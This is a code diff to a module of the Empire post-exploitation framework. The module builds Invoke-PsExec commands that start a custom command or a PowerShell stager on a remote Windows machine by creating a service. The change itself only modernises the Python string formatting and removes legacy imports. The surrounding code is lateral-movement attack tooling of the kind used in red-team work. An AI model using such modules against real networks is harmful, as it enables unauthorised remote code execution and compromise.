@@ -1,13 +1,10 @@
-from __future__ import print_function
-
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -46,8 +43,9 @@ class Module(object):
             # executing a custom command on the remote machine
             customCmd = "%COMSPEC% /C start /b " + command.replace('"', '\\"')
             script_end += (
-                'Invoke-PsExec -ComputerName %s -ServiceName "%s" -Command "%s"'
-                % (computer_name, service_name, customCmd)
+                'Invoke-PsExec -ComputerName {} -ServiceName "{}" -Command "{}"'.format(
+                    computer_name, service_name, customCmd
+                )
             )
 
             if result_file != "":
@@ -80,9 +78,8 @@ class Module(object):
                         "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
                         + launcher
                     )
-                    script_end += (
-                        'Invoke-PsExec -ComputerName %s -ServiceName "%s" -Command "%s"'
-                        % (computer_name, service_name, stager_cmd)
+                    script_end += 'Invoke-PsExec -ComputerName {} -ServiceName "{}" -Command "{}"'.format(
+                        computer_name, service_name, stager_cmd
                     )
 
         outputf = params.get("OutputFunction", "Out-String")
